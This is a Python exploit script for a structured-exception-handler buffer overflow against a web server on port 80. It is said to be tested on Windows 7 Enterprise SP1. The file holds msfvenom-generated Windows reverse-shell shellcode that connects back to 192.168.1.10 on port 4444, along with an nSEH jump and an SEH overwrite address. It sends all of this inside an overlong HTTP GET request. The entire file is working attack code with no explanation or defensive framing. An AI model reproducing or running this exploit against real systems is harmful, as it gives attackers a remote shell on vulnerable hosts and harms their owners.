#!/usr/bin/python

'''Tested on Windows 7 Enterprise SP1'''

import sys,struct,os,socket

host = '192.168.1.250'
port = 80

# bad characters: "\x00\x20\x25\x2b\x2f\x5c"

#msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 EXITFUNC=thread -f c -b "\x00\x20\x25\x2b\x2f\x5c"
shellcode = ("\xba\x80\x31\xd8\x63\xda\xc0\xd9\x74\x24\xf4\x5d\x31\xc9\xb1"
"\x52\x83\xc5\x04\x31\x55\x0e\x03\xd5\x3f\x3a\x96\x29\xd7\x38"
"\x59\xd1\x28\x5d\xd3\x34\x19\x5d\x87\x3d\x0a\x6d\xc3\x13\xa7"
"\x06\x81\x87\x3c\x6a\x0e\xa8\xf5\xc1\x68\x87\x06\x79\x48\x86"
"\x84\x80\x9d\x68\xb4\x4a\xd0\x69\xf1\xb7\x19\x3b\xaa\xbc\x8c"
"\xab\xdf\x89\x0c\x40\x93\x1c\x15\xb5\x64\x1e\x34\x68\xfe\x79"
"\x96\x8b\xd3\xf1\x9f\x93\x30\x3f\x69\x28\x82\xcb\x68\xf8\xda"
"\x34\xc6\xc5\xd2\xc6\x16\x02\xd4\x38\x6d\x7a\x26\xc4\x76\xb9"
"\x54\x12\xf2\x59\xfe\xd1\xa4\x85\xfe\x36\x32\x4e\x0c\xf2\x30"
"\x08\x11\x05\x94\x23\x2d\x8e\x1b\xe3\xa7\xd4\x3f\x27\xe3\x8f"
"\x5e\x7e\x49\x61\x5e\x60\x32\xde\xfa\xeb\xdf\x0b\x77\xb6\xb7"
"\xf8\xba\x48\x48\x97\xcd\x3b\x7a\x38\x66\xd3\x36\xb1\xa0\x24"
"\x38\xe8\x15\xba\xc7\x13\x66\x93\x03\x47\x36\x8b\xa2\xe8\xdd"
"\x4b\x4a\x3d\x71\x1b\xe4\xee\x32\xcb\x44\x5f\xdb\x01\x4b\x80"
"\xfb\x2a\x81\xa9\x96\xd1\x42\x16\xce\xd8\x98\xfe\x0d\xda\x8d"
"\xa2\x98\x3c\xc7\x4a\xcd\x97\x70\xf2\x54\x63\xe0\xfb\x42\x0e"
"\x22\x77\x61\xef\xed\x70\x0c\xe3\x9a\x70\x5b\x59\x0c\x8e\x71"
"\xf5\xd2\x1d\x1e\x05\x9c\x3d\x89\x52\xc9\xf0\xc0\x36\xe7\xab"
"\x7a\x24\xfa\x2a\x44\xec\x21\x8f\x4b\xed\xa4\xab\x6f\xfd\x70"
"\x33\x34\xa9\x2c\x62\xe2\x07\x8b\xdc\x44\xf1\x45\xb2\x0e\x95"
"\x10\xf8\x90\xe3\x1c\xd5\x66\x0b\xac\x80\x3e\x34\x01\x45\xb7"
"\x4d\x7f\xf5\x38\x84\x3b\x15\xdb\x0c\x36\xbe\x42\xc5\xfb\xa3"
"\x74\x30\x3f\xda\xf6\xb0\xc0\x19\xe6\xb1\xc5\x66\xa0\x2a\xb4"
"\xf7\x45\x4c\x6b\xf7\x4f")

nseh = '\xeb\x06\x90\x90'
seh = struct.pack("<I",0x100231BE)

payload = 'A' * 4061
payload += nseh
payload += seh
payload += '\x90' * 30
payload += shellcode
payload += 'D' * (5000 - len(payload)) # 917 bytes to play with


request = "GET /" + payload + " HTTP/1.0\r\n"

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host,port))
sock.send(request)
sock.close()